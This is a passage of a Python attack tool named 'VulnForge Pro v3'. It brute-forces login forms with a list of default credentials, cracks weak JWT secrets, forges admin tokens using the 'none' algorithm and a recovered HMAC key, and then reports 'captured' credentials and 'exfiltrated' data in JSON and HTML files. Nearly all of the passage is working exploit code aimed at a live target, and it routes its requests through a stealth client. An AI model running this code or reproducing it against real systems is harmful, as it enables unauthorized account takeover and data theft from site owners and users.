print(f"\n{Y}[PHASE 20]{RS} {BD}Default Credentials Testing...{RS}")

default_creds_list = [
    ('admin', 'admin'), ('admin', 'password'), ('admin', 'admin123'),
    ('admin', 'root'), ('admin', '123456'), ('admin', 'letmein'),
    ('admin', 'admin1'), ('admin', 'administrator'), ('admin', 'passw0rd'),
    ('root', 'root'), ('root', 'toor'), ('root', 'admin'),
    ('user', 'user'), ('user', 'password'), ('user', '123456'),
    ('guest', 'guest'), ('test', 'test'), ('demo', 'demo'),
    ('administrator', 'administrator'), ('administrator', 'admin'),
    ('admin@domain.com', 'admin'), ('admin@test.com', 'admin'),
    ('support', 'support'), ('info', 'info'), ('webmaster', 'webmaster'),
    ('postmaster', 'postmaster'), ('noreply', 'noreply'),
    ('service', 'service'), ('sa', 'sa'), ('oracle', 'oracle'),
    ('tomcat', 'tomcat'), ('jboss', 'jboss'), ('weblogic', 'weblogic'),
    ('admin', '1234567890'), ('admin', 'qwerty'), ('admin', '12345'),
    ('admin', 'password1'), ('admin', 'Password1'), ('admin', 'Admin123'),
]

for form in all_forms:
    if any(k in form['action'].lower() for k in ['login', 'signin', 'auth', 'log-in', 'admin']):
        try:
            r = stealth.get(form['url'])
            if not r:
                continue
            soup = BeautifulSoup(r.text, 'html.parser')
            
            # Get CSRF if present
            csrf = None
            meta = soup.find('meta', attrs={'name': 'csrf-token'})
            if meta: csrf = meta.get('content', '')
            hidden = soup.find('input', attrs={'name': '_token'})
            if hidden: csrf = hidden.get('value', '')
            
            for uname, pwd in default_creds_list[:25]:
                data = {}
                for inp in form['inputs']:
                    if inp['type'] in ['email', 'text']:
                        data[inp['name']] = uname
                    elif inp['type'] == 'password':
                        data[inp['name']] = pwd
                    elif inp['name'] == '_token' and '_token' not in data:
                        data['_token'] = csrf or ''
                
                if not data:
                    data = {'email': uname, 'password': pwd}
                    if csrf: data['_token'] = csrf
                
                try:
                    r2 = stealth.post(form['action'], data=data, allow_redirects=True)
                    if r2:
                        # Check various success indicators
                        success_indicators = ['dashboard', 'profile', 'welcome', 'logout', 'admin']
                        if r2.status_code == 302 or any(k in r2.url.lower() for k in success_indicators):
                            vuln(f"Default credentials worked: {uname}:{pwd}", "Critical", form['action'])
                            add_vuln("Default Credentials", "Critical", form['action'])
                            cred(f"Default Creds: {uname}:{pwd}")
                            add_cred("Default Credentials", uname, pwd)
                            exploit(f"Authentication bypass with default creds!", form['action'])
                            add_exploit("Default Credentials", form['action'])
                            break
                except:
                    continue
        except:
            continue

# ============= PHASE 21: JWT TESTING =============
print(f"\n{Y}[PHASE 21]{RS} {BD}JWT Testing...{RS}")

# Check for JWT in cookies, headers, or page content
jwt_pattern = re.compile(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}')

# Check main page and responses
for url_to_check in [target] + all_links[:5]:
    try:
        r = stealth.get(url_to_check)
        if not r:
            continue
        
        # Check response body
        jwt_matches = jwt_pattern.findall(r.text)
        # Check cookies
        for cookie in r.cookies:
            if cookie.value and jwt_pattern.search(cookie.value):
                jwt_matches.append(cookie.value)
        # Check headers
        auth_header = r.headers.get('Authorization', '')
        if jwt_pattern.search(auth_header):
            jwt_matches.append(auth_header)
        
        for jwt in list(set(jwt_matches))[:3]:
            try:
                parts = jwt.split('.')
                header_b64 = parts[0]
                payload_b64 = parts[1]
                
                # Pad for base64
                def pad_b64(s):
                    return s + '=' * (4 - len(s) % 4) if len(s) % 4 else s
                
                header = json.loads(base64.b64decode(pad_b64(header_b64)).decode('utf-8', errors='replace'))
                payload = json.loads(base64.b64decode(pad_b64(payload_b64)).decode('utf-8', errors='replace'))
                
                info(f"JWT found: alg={header.get('alg', 'unknown')}")
                
                # Check for 'none' algorithm
                if header.get('alg') == 'none':
                    vuln("JWT 'none' algorithm attack", "Critical", url_to_check)
                    add_vuln("JWT None Algorithm", "Critical", url_to_check)
                    # Create a forged JWT with 'none'
                    forged_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=').decode()
                    forged_payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin", "iat": int(time.time())}).encode()).rstrip(b'=').decode()
                    forged_jwt = f"{forged_header}.{forged_payload}."
                    info(f"  Forged JWT: {forged_jwt[:50]}...")
                    add_exploit("JWT None Algorithm Exploit", url_to_check, forged_jwt[:100])
                
                # Check for weak secret (HS256)
                if header.get('alg') in ['HS256', 'HS384', 'HS512']:
                    common_secrets = ['secret', 'password', 'admin', 'key', '123456', 'changeme', 'test', 'jwt_secret']
                    for secret in common_secrets:
                        try:
                            import hmac
                            sig = parts[2]
                            expected_sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
                            if sig == expected_sig:
                                vuln(f"JWT weak secret: '{secret}'", "Critical", url_to_check)
                                add_vuln("JWT Weak Secret", "Critical", url_to_check)
                                # Forge admin token
                                forged_header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b'=').decode()
                                forged_payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin", "iat": int(time.time())}).encode()).rstrip(b'=').decode()
                                forged_sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f"{forged_header}.{forged_payload}".encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
                                forged_jwt = f"{forged_header}.{forged_payload}.{forged_sig}"
                                exploit(f"JWT Forged: {forged_jwt[:80]}...", url_to_check)
                                add_exploit("JWT Secret Cracking", url_to_check, f"secret={secret}")
                                add_cred("JWT Forged", "admin", forged_jwt[:100], "admin")
                                break
                        except:
                            continue
                
                # Check sensitive data in JWT payload
                sensitive_fields = ['password', 'secret', 'token', 'ssn', 'credit', 'phone']
                for field in sensitive_fields:
                    if field in str(payload).lower():
                        vuln(f"JWT contains sensitive data: '{field}'", "High", url_to_check)
                        add_vuln("JWT Sensitive Data", "High", url_to_check)
                
                add_exfil("JWT", "Token", f"Header: {json.dumps(header)[:100]}, Payload: {json.dumps(payload)[:200]}")
                
            except:
                continue
    except:
        continue

# ============= SUMMARY =============
elapsed = time.time() - scan_start_time

print(f"\n{'='*65}")
print(f" {BD}EXPLOITATION SUMMARY{RS}")
print(f"{'='*65}\n")

vulns = results['vulnerabilities']
exploits = results['exploits']
creds = results['credentials']
exfil_data = results['exfiltrated_data']

crit = sum(1 for v in vulns if v['severity'] == 'Critical')
high = sum(1 for v in vulns if v['severity'] == 'High')
med = sum(1 for v in vulns if v['severity'] == 'Medium')
low = sum(1 for v in vulns if v['severity'] == 'Low')

print(f"  Vulnerabilities Found: {BD}{len(vulns)}{RS}")
print(f"    {R}Critical: {crit}{RS}")
print(f"    {M}High: {high}{RS}")
print(f"    {Y}Medium: {med}{RS}")
print(f"    {C}Low: {low}{RS}")
print(f"\n  {R}Successful Exploits: {len(exploits)}{RS}")
print(f"  {G}Credentials Captured: {len(creds)}{RS}")
print(f"  {Y}Data Exfiltrated: {len(exfil_data)}{RS}")

# Print unique vulns by severity
if vulns:
    print(f"\n  {BD}Vulnerability Breakdown:{RS}")
    t = PrettyTable()
    t.field_names = ["Severity", "Type", "URL"]
    t.max_width["URL"] = 60
    t.max_width["Type"] = 35
    seen_vulns = set()
    for v in sorted(vulns, key=lambda x: {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3}.get(x['severity'], 4)):
        key = f"{v['name']}|{v['url']}"
        if key not in seen_vulns:
            seen_vulns.add(key)
            t.add_row([v['severity'], v['name'][:35], v['url'][:60]])
    print(f"  {t}")

# Print credentials table
if creds:
    print(f"\n  {G}Credentials Extracted ({len(creds)}):{RS}")
    t = PrettyTable()
    t.field_names = ["Source", "Username", "Password", "Role"]
    t.max_width["Username"] = 30
    t.max_width["Password"] = 30
    seen_creds = set()
    for c in creds:
        key = f"{c['source']}|{c['username']}|{c['password']}"
        if key not in seen_creds:
            seen_creds.add(key)
            t.add_row([c['source'][:20], c['username'][:30], c['password'][:30], c.get('role','')[:15]])
    print(f"  {t}")

# Print exfiltrated data
if exfil_data:
    print(f"\n  {Y}Exfiltrated Data Snapshot ({len(exfil_data)}):{RS}")
    seen_data = set()
    for d in exfil_data:
        key = f"{d['source']}|{d['data_type']}"
        if key not in seen_data:
            seen_data.add(key)
            content_preview = d['content'][:120].replace('\n', ' ').replace('\r', '')
            print(f"    [{d['source']}] {d['data_type']}: {content_preview}...")

# ============= SAVE REPORT =============
report_name = f"{args.output}.json"
html_report_name = f"{args.output}.html"

with open(report_name, 'w') as f:
    json.dump(results, f, indent=2, default=str)

# Generate HTML report
html_report = f"""<!DOCTYPE html>
<html>
<head><title>VulnForge Pro Report - {target}</title>
<style>
body {{ font-family: 'Courier New', monospace; background: #0a0a1a; color: #e0e0e0; padding: 20px; }}
h1 {{ color: #ff4444; text-shadow: 0 0 10px #ff4444; }}
h2 {{ color: #ffaa00; border-bottom: 1px solid #333; }}
.vuln-crit {{ color: #ff4444; background: #2a0000; }}
.vuln-high {{ color: #ff8800; }}
.vuln-med {{ color: #ffaa00; }}
.vuln-low {{ color: #00ccff; }}
table {{ border-collapse: collapse; width: 100%; margin: 10px 0; }}
th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
th {{ background: #1a1a2e; color: #ffaa00; }}
tr:nth-child(even) {{ background: #0f0f1f; }}
.data {{ background: #1a1a2e; padding: 10px; margin: 5px 0; border-left: 3px solid #ff4444; font-size: 0.9em; }}
.summary {{ display: flex; gap: 20px; margin: 20px 0; }}
.summary-box {{ padding: 15px; border-radius: 5px; flex: 1; text-align: center; }}
.summary-crit {{ background: #2a0000; border: 1px solid #ff4444; }}
.summary-high {{ background: #2a1a00; border: 1px solid #ff8800; }}
.summary-med {{ background: #2a2a00; border: 1px solid #ffaa00; }}
.summary-low {{ background: #001a2a; border: 1px solid #00ccff; }}
.cred {{ background: #002a00; padding: 5px; margin: 2px; border-left: 3px solid #00ff00; }}
pre {{ white-space: pre-wrap; word-wrap: break-word; max-height: 300px; overflow: auto; }}
</style></head>
<body>
<h1>🔴 VulnForge Pro v3 - Security Assessment Report</h1>
<p><strong>Target:</strong> {html.escape(target)}</p>
<p><strong>Timestamp:</strong> {results['timestamp']}</p>
<p><strong>Duration:</strong> {elapsed:.2f}s</p>
<p><strong>Total Vulnerabilities:</strong> {len(vulns)} | <strong>Exploits:</strong> {len(exploits)} | <strong>Credentials:</strong> {len(creds)} | <strong>Data Exfiltrated:</strong> {len(exfil_data)}</p>

<div class="summary">
<div class="summary-box summary-crit"><h3>Critical</h3><h1>{crit}</h1></div>
<div class="summary-box summary-high"><h3>High</h3><h1>{high}</h1></div>
<div class="summary-box summary-med"><h3>Medium</h3><h1>{med}</h1></div>
<div class="summary-box summary-low"><h3>Low</h3><h1>{low}</h1></div>
</div>

<h2>Vulnerabilities ({len(vulns)})</h2>
<table>
<tr><th>Severity</th><th>Vulnerability</th><th>URL</th><th>Detail</th></tr>
"""
for v in sorted(vulns, key=lambda x: {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3}.get(x['severity'], 4)):
    cls = f"class='vuln-{v['severity'].lower()}'" if v['severity'].lower() in ['critical', 'high', 'medium', 'low'] else ""
    html_report += f"<tr {cls}><td>{v['severity']}</td><td>{html.escape(v['name'])}</td><td>{html.escape(v['url'][:80])}</td><td>{html.escape(v.get('detail',''))[:60]}</td></tr>"

html_report += f"""</table>

<h2>Exploits ({len(exploits)})</h2>
<table>
<tr><th>Exploit</th><th>URL</th><th>Detail</th></tr>
"""
for e in exploits:
    html_report += f"<tr><td>{html.escape(e['name'])}</td><td>{html.escape(e['url'][:80])}</td><td>{html.escape(e.get('detail',''))[:60]}</td></tr>"

html_report += f"""</table>

<h2>Credentials ({len(creds)})</h2>
"""
for c in creds:
    html_report += f"<div class='cred'>🔑 <strong>{html.escape(c['source'])}</strong> → <em>{html.escape(c['username'])}</em> : <em>{html.escape(c['password'])}</em></div>"

html_report += f"""
<h2>Exfiltrated Data ({len(exfil_data)})</h2>
"""
for d in exfil_data[:30]:
    html_report += f"<div class='data'><b>📁 {html.escape(d['source'])} - {html.escape(d['data_type'])}</b><br><pre>{html.escape(d['content'][:600])}</pre></div>"

html_report += f"""
<h2>Info</h2>
<ul>
"""
for i in results['info']:
    html_report += f"<li>{html.escape(i)}</li>"
html_report += "</ul></body></html>"

with open(html_report_name, 'w', encoding='utf-8') as f:
    f.write(html_report)

print(f"\n{'='*65}")
print(f" {G}Scan completed in {BD}{elapsed:.2f}s{RS}")
print(f"{'='*65}\n")
print(f"  {G}[+]{RS} JSON Report: {BD}{report_name}{RS}")
print(f"  {G}[+]{RS} HTML Report: {BD}{html_report_name}{RS}")
print(f"\n{BD}Scan complete. Ghassen out N.{RS}")